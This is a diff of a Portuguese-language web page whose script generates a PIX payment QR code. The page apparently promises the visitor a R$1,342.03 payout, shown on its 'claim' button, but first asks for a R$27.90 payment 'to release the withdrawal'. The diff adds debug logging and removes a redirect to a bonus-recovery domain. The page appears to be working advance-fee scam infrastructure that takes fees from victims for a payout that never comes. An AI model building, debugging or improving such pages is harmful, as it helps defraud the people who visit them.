@@ -23,14 +23,8 @@
     padding: 25px 20px;
     font-size: 22px;
     font-weight: 900;
-    text-transform: uppercase;
     border-radius: 12px;
     cursor: pointer;
-}
-
-.btn-resgatar:disabled {
-    background: #ccc;
-    cursor: wait;
 }
 
 .overlay {
@@ -52,22 +46,19 @@
     border-radius: 20px;
     z-index: 9999;
     text-align: center;
-    width: 90%;
-    max-width: 400px;
+    width: 95%;
+    max-width: 420px;
 }
 
-.btn-final {
-    display: none;
-    background: #007bff;
-    color: white;
-    border: none;
-    padding: 15px;
-    width: 100%;
-    border-radius: 50px;
-    font-weight: 700;
-    font-size: 16px;
+#debug {
     margin-top: 15px;
-    cursor: pointer;
+    font-size: 11px;
+    text-align: left;
+    max-height: 150px;
+    overflow: auto;
+    background: #f1f1f1;
+    padding: 10px;
+    border-radius: 8px;
 }
 </style>
 </head>
@@ -83,8 +74,8 @@
 <div class="overlay" id="overlay"></div>
 
 <div class="modal-pix" id="modal_pix">
-    <h3 id="status_titulo">✅ QR CODE GERADO</h3>
-    <p id="status_texto">Finalize o pagamento para liberar seu saque.</p>
+    <h3 id="status_titulo">Status</h3>
+    <p id="status_texto"></p>
 
     <div id="qr_code_div" style="margin:20px 0;"></div>
 
@@ -93,15 +84,16 @@
         border:1px solid #ddd; border-radius:8px; padding:10px;
         font-size:12px;" readonly></textarea>
 
-    <button class="btn-final" id="btn_final"
-        onclick="window.location.href='https://recuperabonushopp.com/elementor-1064'">
-        ACESSAR MEU BENEFÍCIO
-    </button>
+    <div id="debug"></div>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
 <script>
+
+function logDebug(message) {
+    document.getElementById("debug").innerHTML += message + "<br>";
+}
 
 function gerarPix() {
 
@@ -114,92 +106,74 @@ function gerarPix() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ valor: "27.90" })
     })
-    .then(res => res.json())
-    .then(data => {
+    .then(response => {
+        logDebug("HTTP Status: " + response.status);
+        return response.text();
+    })
+    .then(text => {
 
-        console.log("Resposta do servidor:", data);
+        logDebug("Resposta RAW:");
+        logDebug(text);
 
-        // 🔥 VALIDAÇÃO FLEXÍVEL
-        if (data && (data.payload || data.qr || data.pixCode)) {
+        let data;
 
-            const payload = data.payload || data.qr || data.pixCode;
-
-            document.getElementById("overlay").style.display = "block";
-            document.getElementById("modal_pix").style.display = "block";
-            document.getElementById("txt_codigo").value = payload;
-
-            const qrDiv = document.getElementById("qr_code_div");
-            qrDiv.innerHTML = "";
-
-            if (data.encodedImage && data.encodedImage.length > 50) {
-                const src = data.encodedImage.startsWith('http')
-                    ? data.encodedImage
-                    : `data:image/png;base64,${data.encodedImage}`;
-                qrDiv.innerHTML = `<img src="${src}" style="width:200px;">`;
-            } else {
-                new QRCode(qrDiv, {
-                    text: payload,
-                    width: 200,
-                    height: 200
-                });
-            }
-
-            const transactionId =
-                data.transactionId ||
-                data.id ||
-                data.txid ||
-                data.paymentId;
-
-            if (transactionId) {
-                verificarPagamento(transactionId);
-            } else {
-                console.warn("TransactionId não encontrado.");
-            }
-
-        } else {
-            alert("Erro ao gerar QR Code.");
-            btn.innerHTML = "RESGATAR R$ 1.342,03";
-            btn.disabled = false;
+        try {
+            data = JSON.parse(text);
+            logDebug("JSON convertido com sucesso.");
+        } catch (e) {
+            logDebug("Erro ao converter JSON: " + e);
+            document.getElementById("status_titulo").innerHTML = "Erro";
+            document.getElementById("status_texto").innerHTML =
+                "Servidor não retornou JSON válido.";
+            abrirModal();
+            return;
         }
+
+        if (!data.payload) {
+            logDebug("Payload não encontrado no JSON.");
+            document.getElementById("status_titulo").innerHTML = "Erro";
+            document.getElementById("status_texto").innerHTML =
+                "Servidor não retornou o código PIX.";
+            abrirModal();
+            return;
+        }
+
+        abrirModal();
+
+        document.getElementById("status_titulo").innerHTML =
+            "✅ QR CODE GERADO";
+
+        document.getElementById("status_texto").innerHTML =
+            "Finalize o pagamento para liberar.";
+
+        document.getElementById("txt_codigo").value = data.payload;
+
+        const qrDiv = document.getElementById("qr_code_div");
+        qrDiv.innerHTML = "";
+
+        new QRCode(qrDiv, {
+            text: data.payload,
+            width: 200,
+            height: 200
+        });
 
     })
     .catch(error => {
-        console.error("Erro:", error);
-        alert("Erro de conexão com servidor.");
-        btn.innerHTML = "RESGATAR R$ 1.342,03";
-        btn.disabled = false;
+
+        logDebug("Erro FETCH:");
+        logDebug(error);
+
+        document.getElementById("status_titulo").innerHTML = "Erro de conexão";
+        document.getElementById("status_texto").innerHTML =
+            "Não foi possível conectar ao servidor.";
+
+        abrirModal();
     });
 }
 
-function verificarPagamento(transactionId) {
-
-    const intervalo = setInterval(() => {
-
-        fetch(`https://checkout-pix-profissional.onrender.com/status/${transactionId}`)
-        .then(res => res.json())
-        .then(data => {
-
-            console.log("Status:", data);
-
-            const status = data.status || data.paymentStatus || data.situation;
-
-            if (status === "approved" || status === "paid" || status === "CONFIRMED") {
-
-                clearInterval(intervalo);
-
-                document.getElementById("status_titulo").innerHTML =
-                    "🎉 PAGAMENTO APROVADO!";
-
-                document.getElementById("status_texto").innerHTML =
-                    "Seu pagamento foi confirmado com sucesso.";
-
-                document.getElementById("btn_final").style.display = "block";
-            }
-
-        })
-        .catch(err => console.error("Erro status:", err));
-
-    }, 5000);
+function abrirModal() {
+    document.getElementById("overlay").style.display = "block";
+    document.getElementById("modal_pix").style.display = "block";
 }
 
 </script>
